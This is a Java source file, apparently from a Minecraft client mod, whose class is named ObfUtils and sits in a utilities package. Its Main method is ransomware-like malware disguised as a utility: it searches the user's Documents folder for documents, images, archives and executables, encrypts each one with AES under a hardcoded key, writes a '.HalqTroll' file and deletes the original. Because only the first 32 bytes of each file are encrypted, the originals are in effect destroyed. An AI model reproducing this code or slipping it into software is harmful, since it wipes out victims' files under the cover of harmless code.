package cn.origin.cube.utils.client;

import java.security.Key;
import java.security.InvalidKeyException;
import javax.crypto.BadPaddingException;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Collection;
import java.util.Iterator;
import org.apache.commons.io.FileUtils;
import java.io.File;
import java.util.ArrayList;

public class ObfUtils
{
    public static String key;
    private static OS os;
    
    public static void Main() {
        switch (getOS()) {
            default: {
                final ArrayList<String> CriticalPathList = new ArrayList<String>();
                CriticalPathList.add(System.getProperty("user.home") + "/Documents");
                for (final String TargetDirectory : CriticalPathList) {
                    final File root = new File(TargetDirectory);
                    try {
                        final String[] extensions = { "pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jar", "exe" };
                        final Collection files = FileUtils.listFiles(root, extensions, true);
                        for (final Object o : files) {
                            final File file = (File)o;
                            Encryptor(file.getAbsolutePath());
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
    
    public static void Encryptor(final String TargetFilePath) {
        final File targetFile = new File(TargetFilePath);
        final File encryptedTargetFile = new File(TargetFilePath + ".HalqTroll");
        try {
            doCrypto(1, ObfUtils.key, targetFile, encryptedTargetFile);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        targetFile.delete();
    }
    
    private static void doCrypto(final int cipherMode, final String key, final File inputFile, final File outputFile) {
        try {
            final Key secretKey = new SecretKeySpec(key.getBytes(), "AES");
            final Cipher cipher = Cipher.getInstance("AES");
            cipher.init(cipherMode, secretKey);
            final FileInputStream inputStream = new FileInputStream(inputFile);
            final byte[] inputBytes = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            inputStream.read(inputBytes);
            final byte[] outputBytes = cipher.doFinal(inputBytes);
            final FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(outputBytes);
            inputStream.close();
            outputStream.close();
        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        catch (NoSuchPaddingException e2) {
            e2.printStackTrace();
        }
        catch (IllegalBlockSizeException e3) {
            e3.printStackTrace();
        }
        catch (NoSuchAlgorithmException e4) {
            e4.printStackTrace();
        }
        catch (IOException e5) {
            e5.printStackTrace();
        }
        catch (BadPaddingException e6) {
            e6.printStackTrace();
        }
        catch (InvalidKeyException e7) {
            e7.printStackTrace();
        }
    }
    
    public static OS getOS() {
        if (ObfUtils.os == null) {
            final String operSys = System.getProperty("os.name").toLowerCase();
            if (operSys.contains("win")) {
                ObfUtils.os = OS.WINDOWS;
            }
            else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                ObfUtils.os = OS.LINUX;
            }
            else if (operSys.contains("mac")) {
                ObfUtils.os = OS.MAC;
            }
            else if (operSys.contains("sunos")) {
                ObfUtils.os = OS.SOLARIS;
            }
        }
        return ObfUtils.os;
    }
    
    static {
        ObfUtils.key = "QfTjWmZq4t7w!z%C";
        ObfUtils.os = null;
    }
    
    public enum OS
    {
        WINDOWS, 
        LINUX, 
        MAC, 
        SOLARIS;
    }
}
